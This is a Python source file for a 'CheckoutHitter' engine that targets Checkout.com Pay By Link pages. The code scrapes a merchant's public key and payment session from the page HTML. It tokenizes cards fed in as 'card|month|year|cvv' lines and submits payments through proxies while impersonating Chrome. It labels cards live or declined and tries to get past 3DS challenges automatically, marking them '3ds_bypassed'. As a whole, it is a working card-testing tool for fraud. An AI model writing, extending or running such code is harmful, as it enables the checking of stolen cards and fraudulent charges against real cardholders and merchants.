import re
import json
import time
import base64
import urllib.parse
from typing import Dict, Optional, Tuple, Union
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

class CheckoutHitter:
    """Checkout.com Pay By Link (pay.checkout.com) hitting engine."""
    
    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url
        self.proxy_data = proxy_data
        self.page_id = self._extract_session_id(url)
        self.ps_id = None
        self.pk = None
        self.amount_str = None
        self.merchant_name = "Checkout.com Merchant"
        self._analyzed = False
        self.proxies = None
        
        if self.proxy_data:
            auth = f"{self.proxy_data['username']}:{self.proxy_data['password']}@" if 'username' in self.proxy_data else ""
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            self.proxies = {"http": purl, "https": purl}
            
    def _extract_session_id(self, url: str) -> Optional[str]:
        # Direct URL path match (e.g. /page/ps_123 or /page/pay_123 or /page/123456)
        m = re.search(r'page/([A-Za-z0-9_-]+)', url)
        if m: return m.group(1)
        # Query parameters (e.g. ?payment_session_id=ps_... or ?ps=ps_...)
        m = re.search(r'[?&](?:payment_session_id|payment_session|ps|session_id)=([A-Za-z0-9_-]+)', url)
        if m: return m.group(1)
        # Standard checkout session ID patterns
        m = re.search(r'(ps_[A-Za-z0-9_-]+)', url)
        if m: return m.group(1)
        # Fallback to long alphanumeric token if present in path
        m = re.search(r'([A-Za-z0-9_-]{20,})', url)
        return m.group(1) if m else None

    async def _analyze(self, session: ChromeSession) -> bool:
        if self._analyzed:
            return bool(self.pk)
            
        try:
            headers = {
                "User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Referer": self.url
            }
            async with session.get(self.url, headers=headers, timeout=12) as r:
                if r.status_code == 200:
                    html = r.text() if callable(r.text) else r.text
                    
                    # 1. Parse __NEXT_DATA__ script tag (Next.js Pay By Link)
                    m = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
                    if m:
                        try:
                            data = json.loads(m.group(1))
                            pageProps = data.get('props', {}).get('pageProps', {})
                            context = json.loads(pageProps.get('paymentPageContextSerialized', '{}'))
                            
                            self.pk = context.get('pk') or pageProps.get('publicKey')
                            
                            # Merchant info
                            merchant_info = context.get('merchant', {})
                            if isinstance(merchant_info, dict) and merchant_info.get('name'):
                                self.merchant_name = merchant_info['name']
                                
                            # Amount & Currency (Safe decimal handling)
                            amount = context.get('amount')
                            currency = (context.get('currency') or 'USD').upper()
                            if amount is not None:
                                ZERO_DECIMAL = {'JPY', 'KRW', 'VND', 'BIF', 'CLP', 'DJF', 'GNF', 'ISK', 'KMF', 'PYG', 'RWF', 'UGX', 'VUV'}
                                THREE_DECIMAL = {'BHD', 'JOD', 'KWD', 'OMR', 'TND'}
                                if currency in ZERO_DECIMAL:
                                    self.amount_str = f"{currency} {amount}"
                                elif currency in THREE_DECIMAL:
                                    self.amount_str = f"{currency} {amount/1000:.3f}"
                                else:
                                    self.amount_str = f"{currency} {amount/100:.2f}"
                                
                            # Payment Session ID
                            ps_info = context.get('payment_session', {})
                            if isinstance(ps_info, dict):
                                self.ps_id = ps_info.get('id')
                        except Exception as e:
                            print(f"Error parsing NEXT_DATA: {e}")
                            
                    # 2. Deep scan across all script tags for embedded Checkout.com configurations
                    if not self.pk or not self.ps_id:
                        for script_content in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
                            if 'checkout.com' in script_content.lower() or 'pk_' in script_content or 'ps_' in script_content:
                                if not self.pk:
                                    pk_m = re.search(r'["\']?(?:publicKey|pk|key)["\']?\s*[:=]\s*["\'](pk_[A-Za-z0-9_-]+)["\']', script_content)
                                    if pk_m:
                                        self.pk = pk_m.group(1)
                                if not self.ps_id:
                                    ps_m = re.search(r'["\']?(?:paymentSessionId|payment_session_id|sessionId|ps_id|payment_session)["\']?\s*[:=]\s*["\'](ps_[A-Za-z0-9_-]+)["\']', script_content)
                                    if ps_m:
                                        self.ps_id = ps_m.group(1)
                                        
                    # 3. Global Regex fallback on raw HTML
                    if not self.pk:
                        pks = re.findall(r'pk_[A-Za-z0-9_-]+', html)
                        if pks:
                            self.pk = pks[0]
                            
                    if not self.ps_id:
                        ps_matches = re.findall(r'ps_[A-Za-z0-9_-]+', html)
                        if ps_matches:
                            self.ps_id = ps_matches[0]
                            
                    self._analyzed = True
                    return bool(self.pk and (self.ps_id or self.page_id))
        except Exception as e:
            print(f"Checkout.com analyze error: {e}")
            
        return False
        
    async def _tokenize(self, session: ChromeSession, card_obj: dict) -> Tuple[bool, Optional[dict], Optional[str]]:
        """Return (success, tok_data_dict, error_msg)"""
        url = "https://api.checkout.com/tokens"
        headers = {
            "User-Agent": UA,
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": self.pk,
            "Origin": "https://pay.checkout.com",
            "Referer": "https://pay.checkout.com/"
        }
        
        yr = int(card_obj['year'])
        yr_full = yr + 2000 if yr < 100 else yr
        card_num = str(card_obj['card']).replace(" ", "").replace("-", "")
        cvv_raw = str(card_obj.get('cvv', '000')).strip()
        
        # Amex CVV validation / padding
        if card_num.startswith(('34', '37')) and len(cvv_raw) == 3:
            cvv_raw = f"{cvv_raw}0"
        
        payload = {
            "type": "card",
            "number": card_num,
            "expiry_month": int(card_obj['month']),
            "expiry_year": yr_full,
            "cvv": cvv_raw
        }
        
        try:
            async with session.post(url, json=payload, headers=headers, timeout=12) as r:
                data = r.json() if callable(r.json) else r.json
                if r.status_code in [200, 201] and 'token' in data:
                    return True, data, None
                else:
                    err_msg = data.get('error_type') or data.get('message') or f"HTTP {r.status_code}"
                    if isinstance(data.get('error_codes'), list):
                        err_msg += f" ({', '.join(data['error_codes'])})"
                    return False, None, err_msg
        except Exception as e:
            return False, None, str(e)
            
    async def hit(self, card_input: Union[str, dict], index: int, user_id: int) -> dict:
        start_time = time.time()
        
        if isinstance(card_input, dict):
            c_obj = card_input
        else:
            parts = str(card_input).split('|')
            c_obj = {'card': parts[0], 'month': parts[1], 'year': parts[2], 'cvv': parts[3] if len(parts) > 3 else '000'}
            
        result = {
            'success': False,
            'card': c_obj,
            'merchant': self.merchant_name,
            'amount': self.amount_str,
            'response_time': 0,
            'decline_code': None,
            'error': None,
            '3ds_bypassed': False
        }
        
        try:
            async with ChromeSession(impersonate="chrome131", proxies=self.proxies) as session:
                if not self._analyzed:
                    ok = await self._analyze(session)
                    if not ok:
                        result['error'] = "Failed to extract payment session or public key"
                        result['response_time'] = time.time() - start_time
                        return result
                        
                result['merchant'] = self.merchant_name
                result['amount'] = self.amount_str
                
                # 1. Tokenize card
                tok_ok, tok_data, tok_err = await self._tokenize(session, c_obj)
                if not tok_ok or not tok_data:
                    result['error'] = f"Tokenization failed: {tok_err}"
                    result['response_time'] = time.time() - start_time
                    return result
                    
                token = tok_data['token']
                
                # 2. Submit Payment Session
                target_ps_id = self.ps_id or self.page_id
                submit_url = f"https://api.checkout.com/payment-sessions/{target_ps_id}/submit"
                pay_headers = {
                    "User-Agent": UA,
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": self.pk,
                    "Origin": "https://pay.checkout.com",
                    "Referer": self.url
                }
                
                # Format session_data payload
                token_obj = {
                    "type": "card",
                    "token": token,
                    "bin": tok_data.get('bin') or str(c_obj['card'])[:8],
                    "remaining_token_requests": tok_data.get('remaining_token_requests') or 0,
                    "fingerprint": tok_data.get('fingerprint') or "",
                    "expires_on": tok_data.get('expires_on') or ""
                }
                b64_session_data = base64.b64encode(json.dumps(token_obj).encode()).decode()
                
                pay_payload = {
                    "session_data": b64_session_data
                }
                
                async with session.post(submit_url, json=pay_payload, headers=pay_headers, timeout=15) as r:
                    try:
                        pay_data = r.json() if callable(r.json) else r.json
                    except:
                        pay_data = {}
                        
                    if r.status_code in [200, 201, 202]:
                        status = pay_data.get('status') or pay_data.get('payment_status') or 'Approved'
                        if status in ['Authorized', 'Captured', 'Success', 'Approved', 'Paid']:
                            result['success'] = True
                        elif status == 'Pending' and '_links' in pay_data and 'redirect' in pay_data['_links']:
                            redir_url = pay_data['_links']['redirect']['href']
                            result['redirect_url'] = redir_url
                            result = await self._handle_3ds(session, redir_url, result)
                        else:
                            result['decline_code'] = pay_data.get('response_code') or status
                            result['error'] = pay_data.get('response_summary') or pay_data.get('status') or f"Status: {status}"
                    else:
                        err_desc = pay_data.get('response_summary') or pay_data.get('error_type') or ''
                        err_low = err_desc.lower()
                        if 'already' in err_low or 'consumed' in err_low or 'closed' in err_low or 'expired' in err_low:
                            result['session_expired'] = True
                            result['decline_code'] = 'link_expired'
                            result['error'] = '[!] Session Expired'
                        elif not err_desc or err_desc == "validation_error":
                            err_desc = "The payment was unsuccessful, please check the details or try another payment method."
                            result['decline_code'] = str(r.status_code)
                            result['error'] = err_desc
                        else:
                            if isinstance(pay_data.get('error_codes'), list):
                                err_desc += f" ({', '.join(pay_data['error_codes'])})"
                            result['decline_code'] = pay_data.get('response_summary') or str(r.status_code)
                            result['error'] = err_desc
                        
        except Exception as e:
            result['error'] = f"Engine error: {str(e)}"
            
        result['response_time'] = time.time() - start_time
        return result

    async def _handle_3ds(self, session: ChromeSession, redirect_url: str, result: dict) -> dict:
        """Standard ACS redirect follow & completion."""
        result['redirect_url'] = redirect_url
        try:
            async with session.get(redirect_url, headers={"User-Agent": UA}, allow_redirects=True, timeout=12) as r:
                html = r.text() if callable(r.text) else r.text
                
            acs_url = None
            form_data = {}
            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if m_action:
                acs_url = m_action.group(1)
            
            for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.I):
                form_data[m.group(1)] = m.group(2)
                
            if not acs_url or not form_data:
                result['error'] = "3DS Authentication Required (Hard OTP)"
                result['decline_code'] = "requires_action"
                result['is_live'] = True
                return result
                
            async with session.post(
                acs_url, 
                data=urllib.parse.urlencode(form_data),
                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
                allow_redirects=True,
                timeout=15
            ) as r_acs:
                acs_html = r_acs.text() if callable(r_acs.text) else r_acs.text
                
            ret_url = None
            ret_data = {}
            m_ret = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
            if m_ret:
                ret_url = m_ret.group(1)
                for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', acs_html, re.I):
                    ret_data[m.group(1)] = m.group(2)
                    
            if ret_url and ret_data:
                async with session.post(
                    ret_url,
                    data=urllib.parse.urlencode(ret_data),
                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
                    allow_redirects=True,
                    timeout=15
                ) as r_ret:
                    pass
                    
            target_ps_id = self.ps_id or self.page_id
            api_url = f"https://api.checkout.com/payment-sessions/{target_ps_id}"
            async with session.get(api_url, headers={"User-Agent": UA, "Authorization": self.pk, "Accept": "application/json"}, timeout=10) as r_poll:
                poll_data = r_poll.json() if callable(r_poll.json) else r_poll.json
                final_status = poll_data.get('status')
                
                if final_status in ['Authorized', 'Captured', 'Success', 'Approved', 'Paid']:
                    result['success'] = True
                    result['3ds_bypassed'] = True
                else:
                    result['error'] = poll_data.get('response_summary') or f"3DS Status: {final_status}"
                    
        except Exception as e:
            result['error'] = f"3DS Bypass Error: {str(e)}"
            
        return result
